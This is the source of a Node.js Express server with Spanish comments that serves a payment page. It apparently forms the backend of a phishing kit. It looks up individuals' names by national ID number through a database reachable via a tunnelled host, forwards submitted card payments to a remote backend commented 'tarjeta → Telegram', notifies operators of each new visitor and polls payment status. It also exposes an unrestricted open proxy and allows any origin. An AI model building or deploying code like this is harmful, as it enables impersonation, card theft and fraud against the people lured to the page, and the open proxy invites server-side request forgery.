const express = require("express");
const cors = require("cors");
const fetch = require("node-fetch");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// CONFIGURACIÓN (solo servidor — el navegador nunca las ve)
// ============================================================

// URL base de la API destino para consulta de clientes (NUIP)
const API_BASE =
  process.env.API_BASE_URL ||
  "https://analyze-produces-realm-autos.trycloudflare.com";

// URL del backend de pagos (SOLO se usa aquí en el servidor)
const BACKEND_URL =
  process.env.BACKEND_URL ||
  "https://backvenecol.onrender.com";

// ============================================================
// MIDDLEWARES GLOBALES
// ============================================================

app.use(
  cors({
    origin: "*",
    methods: ["GET", "POST", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization"],
  })
);

app.use(express.json());

// Sirve archivos estáticos desde la raíz del proyecto
app.use(express.static(__dirname));

// ============================================================
// UTILIDAD: extraer nombre completo y nombre de pila
// ============================================================
function extraerNombres(data) {
  if (!data) return { nombre_completo: null, nombre_pila: null };

  const obj = Array.isArray(data) ? data[0] : data;
  if (!obj || typeof obj !== "object") {
    return { nombre_completo: null, nombre_pila: null };
  }

  const camposCompletos = [
    "nombre_completo",
    "nombreCompleto",
    "nombre_completo_cliente",
    "nombres_apellidos",
    "full_name",
    "nombre",
    "name",
    "nombres_cliente",
  ];

  for (const campo of camposCompletos) {
    if (obj[campo] && typeof obj[campo] === "string" && obj[campo].trim() !== "") {
      const completo = obj[campo].trim();
      return {
        nombre_completo: completo,
        nombre_pila: completo.split(/\s+/)[0],
      };
    }
  }

  const nombres =
    obj.nombres ||
    obj.primer_nombre ||
    obj.primernombre ||
    obj.nombre1 ||
    obj.nombre_1 ||
    "";
  const apellidos =
    obj.apellidos ||
    obj.primer_apellido ||
    obj.primerapellido ||
    obj.apellido1 ||
    obj.apellido_1 ||
    "";
  const segundoApellido =
    obj.segundo_apellido ||
    obj.segundoapellido ||
    obj.apellido2 ||
    obj.apellido_2 ||
    "";

  if (nombres || apellidos) {
    const completo = `${nombres} ${apellidos} ${segundoApellido}`
      .replace(/\s+/g, " ")
      .trim();
    const pila = nombres
      ? nombres.split(/\s+/)[0]
      : completo.split(/\s+/)[0];
    return { nombre_completo: completo, nombre_pila: pila };
  }

  if (obj.data && typeof obj.data === "object") return extraerNombres(obj.data);
  if (obj.cliente && typeof obj.cliente === "object") return extraerNombres(obj.cliente);
  if (obj.resultado && typeof obj.resultado === "object") return extraerNombres(obj.resultado);
  if (obj.registro && typeof obj.registro === "object") return extraerNombres(obj.registro);

  return { nombre_completo: null, nombre_pila: null };
}

// ============================================================
// HELPER: reenviar cualquier request al backend de pagos
// (lee BACKEND_URL desde process.env — nunca se expone al front)
// ============================================================
async function forwardToBackend(req, res, method, backendPath, body) {
  const url = `${BACKEND_URL}${backendPath}`;
  try {
    const response = await fetch(url, {
      method,
      headers: { "Content-Type": "application/json", Accept: "application/json" },
      body: method === "GET" || method === "HEAD" ? undefined : JSON.stringify(body || {}),
    });

    const contentType = response.headers.get("content-type") || "";
    const text = await response.text();

    if (contentType.includes("application/json")) {
      try {
        return res.status(response.status).json(JSON.parse(text));
      } catch {
        return res.status(response.status).send(text);
      }
    }
    return res.status(response.status).send(text);
  } catch (err) {
    console.error(`[forward ${backendPath}] Error:`, err.message);
    return res.status(502).json({
      success: false,
      error: "No se pudo conectar con el backend de pagos",
      detail: err.message,
    });
  }
}

// ============================================================
// HEALTH CHECK
// ============================================================
app.get("/health", (_req, res) => {
  res.json({
    status: "ok",
    message: "Servidor unificado activo",
    apiBase: API_BASE,
    // ⚠️ No exponemos BACKEND_URL al cliente. Solo confirmamos que está configurada.
    backendConfigured: Boolean(BACKEND_URL),
  });
});

// ============================================================
// RUTA: buscar cliente (consulta NUIP)
// GET /api/buscar_cliente?cedula=11011545
// ============================================================
app.get("/api/buscar_cliente", async (req, res) => {
  const { cedula } = req.query;

  if (!cedula) {
    return res.status(400).json({ error: "El parámetro 'cedula' es requerido" });
  }

  try {
    const url = `${API_BASE}/consultadb/api_buscar_cliente_inteligente.php?cedula=${encodeURIComponent(cedula)}`;
    const response = await fetch(url, {
      method: "GET",
      headers: { Accept: "application/json" },
    });

    const contentType = response.headers.get("content-type") || "";
    let data;

    if (contentType.includes("application/json")) {
      data = await response.json();
    } else {
      const text = await response.text();
      try {
        data = JSON.parse(text);
      } catch {
        data = { raw: text };
      }
    }

    const { nombre_completo, nombre_pila } = extraerNombres(data);

    res.status(response.status).json({
      cedula,
      nombre_completo,
      nombre_pila,
      raw: data,
    });
  } catch (err) {
    console.error("Error al consultar API destino:", err.message);
    res.status(502).json({
      error: "No se pudo conectar con la API destino",
      detail: err.message,
      cedula,
      nombre_completo: null,
      nombre_pila: null,
      raw: null,
    });
  }
});

// ============================================================
// PROXY GENÉRICO (opcional)
// GET /proxy?url=https://...
// ============================================================
app.get("/proxy", async (req, res) => {
  const targetUrl = req.query.url;

  if (!targetUrl) {
    return res.status(400).json({ error: "El parámetro 'url' es requerido" });
  }

  try {
    const response = await fetch(targetUrl, {
      headers: { Accept: "application/json" },
    });

    const contentType = response.headers.get("content-type") || "";
    let data;

    if (contentType.includes("application/json")) {
      data = await response.json();
    } else {
      const text = await response.text();
      try {
        data = JSON.parse(text);
      } catch {
        data = { raw: text };
      }
    }

    res.status(response.status).json(data);
  } catch (err) {
    console.error("Error proxy genérico:", err.message);
    res.status(502).json({ error: "Fallo en proxy", detail: err.message });
  }
});

// ============================================================
// 🔁 REEMPLAZO DEL PROXY HPM — Rutas explícitas que usan
//    BACKEND_URL desde process.env (nunca se expone al navegador)
// ============================================================

// Notificar nuevo ingreso
app.post("/api/nuevo-ingreso", async (req, res) => {
  return forwardToBackend(req, res, "POST", "/api/nuevo-ingreso", req.body);
});

// Crear pago (tarjeta → Telegram)
app.post("/api/crear-pago", async (req, res) => {
  return forwardToBackend(req, res, "POST", "/api/crear-pago", req.body);
});

// Consultar estado del pago (polling)
app.get("/api/estado-pago/:solicitud_id", async (req, res) => {
  const id = encodeURIComponent(req.params.solicitud_id);
  return forwardToBackend(req, res, "GET", `/api/estado-pago/${id}`);
});

// ============================================================
// FALLBACK: cualquier otra ruta sirve pago.html
// ============================================================
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "pago.html"));
});

// ============================================================
// ARRANQUE
// ============================================================
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Servidor unificado corriendo en puerto ${PORT}`);
  console.log(`   API consulta clientes: ${API_BASE}`);
  console.log(`   Backend pagos: ${BACKEND_URL} (solo server-side)`);
});
